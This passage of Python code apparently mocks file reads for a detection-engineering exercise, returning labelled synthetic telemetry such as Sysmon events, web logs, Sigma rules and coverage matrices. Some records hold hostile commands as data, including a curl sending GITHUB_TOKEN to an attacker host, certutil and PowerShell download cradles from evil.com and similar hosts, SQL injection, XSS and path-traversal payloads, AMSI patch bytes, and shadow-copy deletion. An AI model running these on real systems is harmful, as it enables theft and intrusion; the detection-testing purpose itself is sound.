                    "Alert Details: PORT_SCAN_DETECTED (HIGH_CONFIDENCE)\n"
                    "Targeted Exposed Service Port: 8094\n"
                )
            if "uac_elevation_events" in target_file:
                return (
                    '[\n'
                    '  {"EventID": 4688, "TimeCreated": "2026-11-15T12:00:15.102Z", "SubjectUserName": "operator", "NewProcessName": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ParentProcessName": "C:\\\\Windows\\\\System32\\\\fodhelper.exe", "CommandLine": "cmd.exe /k whoami /groups", "MandatoryLabel": "Mandatory Label\\\\High Mandatory Level", "TokenElevationType": "TokenElevationTypeFull (2)"},\n'
                    '  {"EventID": 1, "TimeCreated": "2026-11-15T12:00:15.105Z", "Provider": "Microsoft-Windows-Sysmon", "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ParentImage": "C:\\\\Windows\\\\System32\\\\fodhelper.exe", "IntegrityLevel": "High", "User": "CORP\\\\operator"}\n'
                    ']\n'
                )
            if "sysmon_injection_events" in target_file:
                return (
                    '[\n'
                    '  {"EventID": 8, "Provider": "Microsoft-Windows-Sysmon", "TimeCreated": "2026-11-15T12:05:44.821Z", "SourceImage": "C:\\\\Windows\\\\Temp\\\\injector.exe", "SourceProcessId": 3120, "TargetImage": "C:\\\\Windows\\\\explorer.exe", "TargetProcessId": 4820, "StartAddress": "0x00007FFB32A1000", "StartFunction": "LoadLibraryW"},\n'
                    '  {"EventID": 10, "Provider": "Microsoft-Windows-Sysmon", "TimeCreated": "2026-11-15T12:05:43.719Z", "SourceImage": "C:\\\\Windows\\\\Temp\\\\injector.exe", "TargetImage": "C:\\\\Windows\\\\explorer.exe", "GrantedAccess": "0x0020", "CallTrace": "UNKNOWN_MODULE|C:\\\\Windows\\\\Temp\\\\injector.exe"}\n'
                    ']\n'
                )
            if "remote_exec_events" in target_file:
                return (
                    '[\n'
                    '  {"EventID": 4624, "TimeCreated": "2026-11-15T12:12:01.302Z", "TargetUserName": "svc_admin", "LogonType": 3, "LogonProcessName": "NtLmSsp", "IpAddress": "10.10.14.10", "Description": "An account was successfully logged on via network authentication (Logon Type 3)"},\n'
                    '  {"EventID": 7045, "TimeCreated": "2026-11-15T12:12:03.119Z", "ServiceName": "PSEXESVC", "ImagePath": "%SystemRoot%\\\\PSEXESVC.exe", "ServiceType": "user mode service", "StartType": "demand start", "AccountName": "LocalSystem"},\n'
                    '  {"EventID": 5861, "Provider": "Microsoft-Windows-WMI-Activity", "TimeCreated": "2026-11-15T12:12:05.420Z", "Operation": "ExecQuery - root\\\\cimv2: SELECT * FROM Win32_Process", "ClientMachine": "OPERATOR-WS"}\n'
                    ']\n'
                )
            if "scheduled_task_events" in target_file:
                return (
                    '[\n'
                    '  {"EventID": 4698, "TimeCreated": "2026-11-15T12:20:11.412Z", "SubjectUserName": "operator", "TaskName": "\\\\Microsoft\\\\Windows\\\\Customer Experience\\\\TelemetryUpdate", "Action": "C:\\\\Windows\\\\Temp\\\\updater.ps1", "Trigger": "ONLOGON", "Principal": "NT AUTHORITY\\\\SYSTEM", "TaskContent": "<Task xmlns=\\"http://schemas.microsoft.com/windows/2004/02/mit/task\\"><Actions><Exec><Command>C:\\\\Windows\\\\Temp\\\\updater.ps1</Command></Exec></Actions></Task>"}\n'
                    ']\n'
                )
            if "beacon_traffic_events" in target_file:
                return (
                    '[\n'
                    '  {"timestamp": "2026-11-15T13:00:15Z", "src_ip": "10.10.14.10", "dst_ip": "10.10.14.90", "dst_port": 8309, "method": "POST", "uri": "/api/v1/ping", "interval_seconds": 15, "jitter_pct": 20, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Trident/7.0"},\n'
                    '  {"timestamp": "2026-11-15T13:00:32Z", "src_ip": "10.10.14.10", "dst_ip": "10.10.14.90", "dst_port": 8309, "method": "POST", "uri": "/api/v1/ping", "interval_seconds": 17, "jitter_pct": 20, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Trident/7.0"}\n'
                    ']\n'
                )
            if "staging_egress_events" in target_file:
                return (
                    '[\n'
                    '  {"timestamp": "2026-11-15T13:10:02Z", "action": "STAGE_ARCHIVE", "staging_path": "/tmp/.staging_vault/db_export.7z", "file_count": 14, "archive_size_bytes": 48200000, "technique": "T1560.001"},\n'
                    '  {"timestamp": "2026-11-15T13:10:45Z", "action": "NETWORK_EGRESS", "dest_ip": "198.51.100.88", "dest_port": 443, "bytes_sent": 48200000, "protocol": "HTTPS_POST", "technique": "T1041"}\n'
                    ']\n'
                )
            if "precursor_events" in target_file:
                return (
                    '[\n'
                    '  {"timestamp": "2026-11-15T13:20:11Z", "process_name": "vssadmin.exe", "command_line": "vssadmin delete shadows /all /quiet", "user": "NT AUTHORITY\\\\SYSTEM", "event_id": 4688, "technique": "T1490"},\n'
                    '  {"timestamp": "2026-11-15T13:20:14Z", "process_name": "crypto_sim.exe", "file_accessed": "/home/operator/decoy/finance_q4_canary.xlsx", "access_type": "WRITE_ACCESS", "alert": "CANARY_FILE_TOUCH_DETECTED", "technique": "T1486"}\n'
                    ']\n'
                )
            if "finance_q4_canary" in target_file:
                return "CONFIDENTIAL_CANARY_FINANCE_DATA_Q4_RESERVES\n"
            if "cloudtrail_iam_events" in target_file:
                return (
                    '[\n'
                    '  {"timestamp": "2026-11-15T13:30:11Z", "event_source": "sts.amazonaws.com", "event_name": "AssumeRole", "source_ip": "10.10.14.10", "userIdentity": {"type": "AssumedRole", "arn": "arn:aws:iam::123456789012:role/app-workload-role"}, "requestParameters": {"roleArn": "arn:aws:iam::123456789012:role/ProdSecOpsAdminRole", "roleSessionName": "operator_cloud_session"}, "technique": "T1552.005"}\n'
                    ']\n'
                )
            if "build_dependency_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:40:02Z",\n'
                    '    "package_manager": "pip",\n'
                    '    "requested_package": "voltcorp-auth-core",\n'
                    '    "resolved_version": "99.0.0",\n'
                    '    "resolved_source": "https://pypi.org/simple/voltcorp-auth-core/",\n'
                    '    "internal_source": "https://pypi.voltcorp.internal/simple/",\n'
                    '    "alert": "UNPINNED_INTERNAL_PACKAGE_RESOLUTION_FROM_PUBLIC_INDEX",\n'
                    '    "technique": "T1195.001"\n'
                    '  }\n'
                    ']\n'
                )
            if "api_access_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:45:15Z",\n'
                    '    "method": "GET",\n'
                    '    "path": "/api/v2/users/usr-90124/profile",\n'
                    '    "authenticated_user": "usr-10442",\n'
                    '    "target_resource_owner": "usr-90124",\n'
                    '    "status_code": 200,\n'
                    '    "user_agent": "python-requests/2.31.0",\n'
                    '    "alert": "UNAUTHORIZED_OBJECT_ID_TRAVERSAL",\n'
                    '    "technique": "T1595.002"\n'
                    '  }\n'
                    ']\n'
                )
            if "kerberos_audit_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:50:22Z",\n'
                    '    "event_id": 4769,\n'
                    '    "service_name": "MSSQLSvc/db01.corp.internal:1433",\n'
                    '    "service_sid": "S-1-5-21-204123567-109238472-83746123-1105",\n'
                    '    "ticket_encryption_type": "0x17",\n'
                    '    "ticket_options": "0x40810000",\n'
                    '    "target_domain_name": "CORP.INTERNAL",\n'
                    '    "client_address": "10.10.14.10",\n'
                    '    "alert": "POTENTIAL_KERBEROASTING_RC4_TICKET_REQUESTED",\n'
                    '    "technique": "T1558.003"\n'
                    '  }\n'
                    ']\n'
                )
            if "workflow_run_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T13:55:40Z",\n'
                    '    "workflow": "pr-builder.yml",\n'
                    '    "trigger_event": "pull_request_target",\n'
                    '    "sender": "external-contributor-42",\n'
                    '    "injected_command": "curl -X POST https://attacker.c2.internal/exfil --data GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}",\n'
                    '    "runner_os": "ubuntu-latest",\n'
                    '    "alert": "UNTRUSTED_PULL_REQUEST_CONTEXT_INJECTION",\n'
                    '    "technique": "T1195.002"\n'
                    '  }\n'
                    ']\n'
                )
            if "amsi_etw_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T14:10:12Z",\n'
                    '    "event_id": "ETW_PROVIDER_DISABLE",\n'
                    '    "provider_guid": "{802ec45a-1e99-4b83-9920-87c98277ba9d}",\n'
                    '    "process_name": "powershell.exe",\n'
                    '    "pid": 4812,\n'
                    '    "user": "DOMAIN\\\\victim_user",\n'
                    '    "patch_target": "ntdll!EtwEventWrite",\n'
                    '    "opcode": "RET_PATCH_0xC3",\n'
                    '    "alert": "ETW_TI_TAMPERING_DETECTED",\n'
                    '    "technique": "T1562.001"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T14:10:45Z",\n'
                    '    "event_id": "AMSI_BUFFER_PATCH",\n'
                    '    "target_dll": "amsi.dll",\n'
                    '    "target_export": "AmsiScanBuffer",\n'
                    '    "patch_bytes": "B8 57 00 07 80 C3",\n'
                    '    "result": "AMSI_RESULT_CLEAN_FORCE",\n'
                    '    "technique": "T1562.001"\n'
                    '  }\n'
                    ']\n'
                )
            if "attck_coverage_matrix" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "technique_id": "T1059.001",\n'
                    '    "name": "PowerShell",\n'
                    '    "tactic": "Execution",\n'
                    '    "red_emulated": true,\n'
                    '    "blue_detected": true,\n'
                    '    "coverage_score": 100,\n'
                    '    "rule_ids": ["SIGMA-PS-001", "SPLUNK-WIN-POWERSHELL-ENCODED"]\n'
                    '  },\n'
                    '  {\n'
                    '    "technique_id": "T1055.001",\n'
                    '    "name": "Dynamic-link Library Injection",\n'
                    '    "tactic": "Defense Evasion",\n'
                    '    "red_emulated": true,\n'
                    '    "blue_detected": false,\n'
                    '    "coverage_score": 25,\n'
                    '    "gap_note": "Sysmon Event ID 8 missing filter for ntdll injection"\n'
                    '  },\n'
                    '  {\n'
                    '    "technique_id": "T1003.001",\n'
                    '    "name": "LSASS Memory",\n'
                    '    "tactic": "Credential Access",\n'
                    '    "red_emulated": true,\n'
                    '    "blue_detected": true,\n'
                    '    "coverage_score": 90,\n'
                    '    "rule_ids": ["SYSMON-10-LSASS-DUMP"]\n'
                    '  }\n'
                    ']\n'
                )
            if "pipeline_run_history" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "run_id": "RUN-2026-CSV-101",\n'
                    '    "timestamp": "2026-11-15T14:15:30Z",\n'
                    '    "suite": "nightly-atomic-red-canary",\n'
                    '    "tests_total": 45,\n'
                    '    "tests_detected": 42,\n'
                    '    "tests_prevented": 38,\n'
                    '    "coverage_pct": 93.3,\n'
                    '    "failed_simulations": [\n'
                    '      {\n'
                    '        "atomic_id": "T1547.001-RegKeyAdd",\n'
                    '        "reason": "Detection latency exceeded 120s SLA"\n'
                    '      }\n'
                    '    ]\n'
                    '  }\n'
                    ']\n'
                )
            if "apt29_exercise_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "exercise_id": "EX-PURPLE-CAPSTONE-2026",\n'
                    '    "threat_actor": "APT29 / Cozy Bear",\n'
                    '    "phase_1_initial_access": {\n'
                    '      "technique": "T1566.001 - Spearphishing Attachment",\n'
                    '      "status": "EMULATED",\n'
                    '      "detected": true,\n'
                    '      "rule": "EDR-PHISH-MALICIOUS-ISO"\n'
                    '    },\n'
                    '    "phase_2_privilege_escalation": {\n'
                    '      "technique": "T1548.002 - Bypass UAC",\n'
                    '      "status": "EMULATED",\n'
                    '      "detected": true,\n'
                    '      "rule": "SIGMA-UAC-FODHELPER"\n'
                    '    },\n'
                    '    "phase_3_lateral_movement": {\n'
                    '      "technique": "T1021.006 - WinRM Remote Execution",\n'
                    '      "status": "EMULATED",\n'
                    '      "detected": true,\n'
                    '      "rule": "WINRM-UNUSUAL-SOURCE-IP"\n'
                    '    },\n'
                    '    "phase_4_data_collection": {\n'
                    '      "technique": "T1560.001 - Archive via Utility",\n'
                    '      "status": "EMULATED",\n'
                    '      "detected": true,\n'
                    '      "rule": "RAR-ARCHIVE-EXFIL-STAGING"\n'
                    '    }\n'
                    '  }\n'
                    ']\n'
                )
            if "ddlc_pipeline_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "stage": "LINTING",\n'
                    '    "tool": "sigma-lint",\n'
                    '    "status": "PASSED",\n'
                    '    "rules_evaluated": 42,\n'
                    '    "syntax_errors": 0\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": "UNIT_TEST",\n'
                    '    "tool": "pytest-detections",\n'
                    '    "status": "PASSED",\n'
                    '    "unit_tests_run": 84,\n'
                    '    "failures": 0\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": "SNR_VALIDATION",\n'
                    '    "tool": "snr-profiler",\n'
                    '    "status": "FLAGGED_HIGH_NOISE",\n'
                    '    "rule_id": "RULE-DAC-104",\n'
                    '    "rule_name": "PowerShell Script Execution - High Frequency Backup",\n'
                    '    "alert_count_24h": 1420,\n'
                    '    "true_positive_rate": 0.05,\n'
                    '    "recommendation": "TUNE_OUTLIER_NOISE"\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": "CANARY_DEPLOYMENT",\n'
                    '    "tool": "cicd-canary-gate",\n'
                    '    "status": "PENDING_TUNING",\n'
                    '    "target_cluster": "staging-siem-01"\n'
                    '  }\n'
                    ']\n'
                )
            if "raw_event_schema" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "source": "windows_security_4688",\n'
                    '    "raw_fields": {\n'
                    '      "EventID": 4688,\n'
                    '      "NewProcessName": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '      "SubjectUserName": "SYSTEM",\n'
                    '      "CommandLine": "cmd.exe /c whoami",\n'
                    '      "ProcessId": "0x1a4"\n'
                    '    },\n'
                    '    "normalized_mapping": {\n'
                    '      "ecs": {\n'
                    '        "process.executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '        "user.name": "SYSTEM",\n'
                    '        "process.command_line": "cmd.exe /c whoami",\n'
                    '        "process.pid": 420\n'
                    '      },\n'
                    '      "cim": {\n'
                    '        "process": "cmd.exe",\n'
                    '        "user": "SYSTEM",\n'
                    '        "cmdline": "cmd.exe /c whoami",\n'
                    '        "process_id": 420\n'
                    '      }\n'
                    '    }\n'
                    '  },\n'
                    '  {\n'
                    '    "source": "linux_auditd_syscall",\n'
                    '    "raw_fields": {\n'
                    '      "type": "SYSCALL",\n'
                    '      "arch": "c000003e",\n'
                    '      "syscall": 59,\n'
                    '      "comm": "id",\n'
                    '      "exe": "/usr/bin/id",\n'
                    '      "uid": 1000\n'
                    '    },\n'
                    '    "normalized_mapping": {\n'
                    '      "ecs": {\n'
                    '        "process.executable": "/usr/bin/id",\n'
                    '        "process.name": "id",\n'
                    '        "user.id": "1000"\n'
                    '      },\n'
                    '      "cim": {\n'
                    '        "process": "id",\n'
                    '        "process_path": "/usr/bin/id",\n'
                    '        "user_id": 1000\n'
                    '      }\n'
                    '    }\n'
                    '  }\n'
                    ']\n'
                )
            if "sample_sigma_rule" in target_file:
                return (
                    "title: Certutil Download Cradle Execution\n"
                    "id: c0a80001-2026-sig-0003-certutil\n"
                    "status: experimental\n"
                    "description: Detects suspicious certutil.exe execution used to download remote payloads\n"
                    "references:\n"
                    "  - https://attack.mitre.org/techniques/T1105/\n"
                    "tags:\n"
                    "  - attack.t1105\n"
                    "  - attack.command_and_control\n"
                    "logsource:\n"
                    "  category: process_creation\n"
                    "  product: windows\n"
                    "detection:\n"
                    "  selection_img:\n"
                    "    Image|endswith: '\\certutil.exe'\n"
                    "  selection_flags:\n"
                    "    CommandLine|contains:\n"
                    "      - '-urlcache'\n"
                    "      - '-split'\n"
                    "  condition: selection_img and selection_flags\n"
                    "fields:\n"
                    "  - CommandLine\n"
                    "  - ParentImage\n"
                    "  - User\n"
                    "falsepositives:\n"
                    "  - Legitimate PKI certificate verification scripts\n"
                    "level: high\n"
                )
            if "sigma_eval_dataset" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 1,\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n'
                    '    "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/beacon.exe beacon.exe",\n'
                    '    "User": "CORP\\\\Administrator",\n'
                    '    "expected_match": true\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 1,\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n'
                    '    "CommandLine": "certutil.exe -verify -urlcache cert.pem",\n'
                    '    "User": "CORP\\\\SecOps",\n'
                    '    "expected_match": false\n'
                    '  }\n'
                    ']\n'
                )
            if "sysmon_event_1_dataset" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 1,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "RuleName": "technique_id=T1105,technique_name=Ingress Tool Transfer",\n'
                    '    "UtcTime": "2026-11-15 16:30:10.104",\n'
                    '    "ProcessGuid": "{d3b07384-0001-0000-0010-440000000000}",\n'
                    '    "ProcessId": "3412",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n'
                    '    "CommandLine": "certutil.exe -urlcache -split -f http://evil-infra.internal/rat.exe C:\\\\Temp\\\\rat.exe",\n'
                    '    "CurrentDirectory": "C:\\\\Users\\\\victim\\\\",\n'
                    '    "User": "CORP\\\\victim",\n'
                    '    "ParentProcessGuid": "{d3b07384-0000-0000-0010-430000000000}",\n'
                    '    "ParentProcessId": "1940",\n'
                    '    "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '    "ParentCommandLine": "cmd.exe",\n'
                    '    "Hashes": "SHA256=A1B2C3D4E5F67890123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 1,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "UtcTime": "2026-11-15 16:31:00.220",\n'
                    '    "ProcessId": "5120",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n'
                    '    "CommandLine": "certutil.exe -verifyctl C:\\\\Certs\\\\test.ctl",\n'
                    '    "User": "CORP\\\\Administrator",\n'
                    '    "ParentImage": "C:\\\\Windows\\\\System32\\\\services.exe",\n'
                    '    "benign": true\n'
                    '  }\n'
                    ']\n'
                )
            if "sysmon_event_3_dataset" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 3,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "RuleName": "technique_id=T1571,technique_name=Non-Standard Port",\n'
                    '    "UtcTime": "2026-11-15 17:10:05.312",\n'
                    '    "ProcessId": "4892",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",\n'
                    '    "User": "CORP\\\\analyst",\n'
                    '    "Protocol": "tcp",\n'
                    '    "Initiated": "true",\n'
                    '    "SourceIp": "10.10.14.90",\n'
                    '    "SourcePort": 49210,\n'
                    '    "DestinationIp": "198.51.100.44",\n'
                    '    "DestinationPort": 8443,\n'
                    '    "label": "ATTACK_POSITIVE"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 3,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:11:15.550",\n'
                    '    "ProcessId": "2310",\n'
                    '    "Image": "C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe",\n'
                    '    "User": "CORP\\\\analyst",\n'
                    '    "Protocol": "tcp",\n'
                    '    "Initiated": "true",\n'
                    '    "SourceIp": "10.10.14.90",\n'
                    '    "SourcePort": 51102,\n'
                    '    "DestinationIp": "142.250.190.46",\n'
                    '    "DestinationPort": 443,\n'
                    '    "label": "BENIGN_BROWSER_TRAFFIC"\n'
                    '  }\n'
                    ']\n'
                )
            if "file_registry_dataset" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 13,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "RuleName": "technique_id=T1547.001,technique_name=Registry Run Keys",\n'
                    '    "UtcTime": "2026-11-15 17:20:11.801",\n'
                    '    "ProcessId": "3820",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\reg.exe",\n'
                    '    "TargetObject": "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater",\n'
                    '    "Details": "C:\\\\Users\\\\Public\\\\updater.exe",\n'
                    '    "label": "ATTACK_PERSISTENCE_RUNKEY"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 11,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:21:04.119",\n'
                    '    "ProcessId": "5040",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '    "TargetFilename": "C:\\\\Users\\\\Operator\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\backdoor.bat",\n'
                    '    "label": "ATTACK_STARTUP_FOLDER"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 13,\n'
                    '    "Channel": "Microsoft-Windows-Sysmon/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:22:30.400",\n'
                    '    "ProcessId": "890",\n'
                    '    "Image": "C:\\\\Windows\\\\System32\\\\sppsvc.exe",\n'
                    '    "TargetObject": "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SoftwareProtectionPlatform\\\\KeepRunningVersion",\n'
                    '    "Details": "10.0.19041",\n'
                    '    "label": "BENIGN_SYSTEM_UPDATE"\n'
                    '  }\n'
                    ']\n'
                )
            if "auth_abuse_dataset" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 4625,\n'
                    '    "Channel": "Security",\n'
                    '    "RuleName": "technique_id=T1110.003,technique_name=Password Spraying",\n'
                    '    "UtcTime": "2026-11-15 17:30:00.120",\n'
                    '    "TargetUserName": "admin",\n'
                    '    "Status": "0xC000006D",\n'
                    '    "SubStatus": "0xC000006A",\n'
                    '    "IpAddress": "198.51.100.77",\n'
                    '    "LogonType": 3,\n'
                    '    "label": "ATTACK_PASSWORD_SPRAY"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 4672,\n'
                    '    "Channel": "Security",\n'
                    '    "RuleName": "technique_id=T1078,technique_name=Valid Accounts",\n'
                    '    "UtcTime": "2026-11-15 17:30:45.340",\n'
                    '    "SubjectUserName": "admin",\n'
                    '    "PrivilegeList": ["SeDebugPrivilege", "SeTcbPrivilege"],\n'
                    '    "label": "ATTACK_SPECIAL_PRIVILEGE_ASSIGNMENT"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 4624,\n'
                    '    "Channel": "Security",\n'
                    '    "UtcTime": "2026-11-15 17:31:10.500",\n'
                    '    "TargetUserName": "svc-backup",\n'
                    '    "LogonType": 5,\n'
                    '    "IpAddress": "127.0.0.1",\n'
                    '    "label": "BENIGN_SERVICE_LOGON"\n'
                    '  }\n'
                    ']\n'
                )
            if "powershell_obfuscation_dataset" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "EventID": 4104,\n'
                    '    "Channel": "Microsoft-Windows-PowerShell/Operational",\n'
                    '    "RuleName": "technique_id=T1059.001,technique_name=PowerShell",\n'
                    '    "UtcTime": "2026-11-15 17:40:02.001",\n'
                    '    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.99/payload.ps1\')",\n'
                    '    "Path": "",\n'
                    '    "label": "ATTACK_DOWNLOAD_CRADLE"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 4104,\n'
                    '    "Channel": "Microsoft-Windows-PowerShell/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:40:35.412",\n'
                    '    "ScriptBlockText": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",\n'
                    '    "Path": "",\n'
                    '    "label": "ATTACK_BASE64_ENCODED"\n'
                    '  },\n'
                    '  {\n'
                    '    "EventID": 4104,\n'
                    '    "Channel": "Microsoft-Windows-PowerShell/Operational",\n'
                    '    "UtcTime": "2026-11-15 17:41:10.900",\n'
                    '    "ScriptBlockText": "Import-Module ActiveDirectory; Get-ADUser -Filter *",\n'
                    '    "Path": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\Modules\\\\ActiveDirectory",\n'
                    '    "label": "BENIGN_ADMINISTRATIVE_POWERSHELL"\n'
                    '  }\n'
                    ']\n'
                )
            if "web_application_logs" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "client_ip": "203.0.113.42",\n'
                    '    "method": "GET",\n'
                    '    "uri": "/search.php?q=test%27%20UNION%20SELECT%20null,username,password%20FROM%20users--",\n'
                    '    "status_code": 200,\n'
                    '    "user_agent": "sqlmap/1.6#stable",\n'
                    '    "label": "ATTACK_SQLI_UNION"\n'
                    '  },\n'
                    '  {\n'
                    '    "client_ip": "198.51.100.15",\n'
                    '    "method": "POST",\n'
                    '    "uri": "/comments.php",\n'
                    '    "status_code": 200,\n'
                    '    "body": "comment=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",\n'
                    '    "user_agent": "Mozilla/5.0",\n'
                    '    "label": "ATTACK_XSS_STORED"\n'
                    '  },\n'
                    '  {\n'
                    '    "client_ip": "198.51.100.88",\n'
                    '    "method": "GET",\n'
                    '    "uri": "/view.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",\n'
                    '    "status_code": 200,\n'
                    '    "user_agent": "curl/7.68.0",\n'
                    '    "label": "ATTACK_PATH_TRAVERSAL_LFI"\n'
                    '  },\n'
                    '  {\n'
                    '    "client_ip": "10.0.0.50",\n'
                    '    "method": "GET",\n'
                    '    "uri": "/index.php?category=electronics&page=1",\n'
                    '    "status_code": 200,\n'
                    '    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",\n'
                    '    "label": "BENIGN_USER_BROWSE"\n'
                    '  }\n'
                    ']\n'
                )
            if "modsecurity_audit_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "transaction_id": "W4o5K8AaBbCcDdEeFf",\n'
                    '    "client_ip": "198.51.100.77",\n'
                    '    "rule_id": 942100,\n'
                    '    "msg": "SQL Injection Attack Detected via libinjection",\n'
                    '    "anomaly_score": 5,\n'
                    '    "paranoia_level": 1,\n'
                    '    "label": "ATTACK_SQLI_LIBINJECTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "transaction_id": "W4o5K9GgHhIiJjKkLl",\n'
                    '    "client_ip": "10.0.0.12",\n'
                    '    "rule_id": 920272,\n'
                    '    "msg": "Multiple URL Encoding Detected",\n'
                    '    "anomaly_score": 3,\n'
                    '    "paranoia_level": 2,\n'
                    '    "label": "BENIGN_FALSE_POSITIVE_ENCODING"\n'
                    '  },\n'
                    '  {\n'
                    '    "transaction_id": "W4o5L0MmNnOoPpQqRr",\n'
                    '    "client_ip": "203.0.113.19",\n'
                    '    "rule_id": 932100,\n'
                    '    "msg": "Remote Command Execution: Unix Shell Command Found",\n'
                    '    "anomaly_score": 5,\n'
                    '    "paranoia_level": 1,\n'
                    '    "label": "ATTACK_RCE_UNIX_SHELL"\n'
                    '  }\n'
                    ']\n'
                )
            if "wazuh_log_corpus" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T12:00:01Z",\n'
                    '    "program_name": "custom_authd",\n'
                    '    "log": "custom_authd[4412]: AUTH_FAILURE user=operator src_ip=198.51.100.22 reason=BAD_PASSWORD",\n'
                    '    "label": "ATTACK_FAILED_AUTH"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T12:00:03Z",\n'
                    '    "program_name": "custom_authd",\n'
                    '    "log": "custom_authd[4412]: AUTH_FAILURE user=operator src_ip=198.51.100.22 reason=BAD_PASSWORD",\n'
                    '    "label": "ATTACK_BRUTEFORCE_BURST"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T12:00:15Z",\n'
                    '    "program_name": "custom_authd",\n'
                    '    "log": "custom_authd[4415]: AUTH_SUCCESS user=operator src_ip=198.51.100.22 session=sess_9941",\n'
                    '    "label": "ATTACK_SUCCESS_AFTER_BURST"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T12:05:00Z",\n'
                    '    "program_name": "custom_authd",\n'
                    '    "log": "custom_authd[4420]: HEALTH_CHECK status=OK latency=2ms",\n'
                    '    "label": "BENIGN_DAEMON_PROBE"\n'
                    '  }\n'
                    ']\n'
                )
            if "tuning_baseline_telemetry" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "process_name": "powershell.exe",\n'
                    '    "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\\\Scripts\\\\BackupNightly.ps1",\n'
                    '    "user": "NT AUTHORITY\\\\SYSTEM",\n'
                    '    "parent_process": "taskeng.exe",\n'
                    '    "label": "BENIGN_SCHEDULED_BACKUP"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "process_name": "powershell.exe",\n'
                    '    "command_line": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAA...",\n'
                    '    "user": "CORP\\\\chethan",\n'
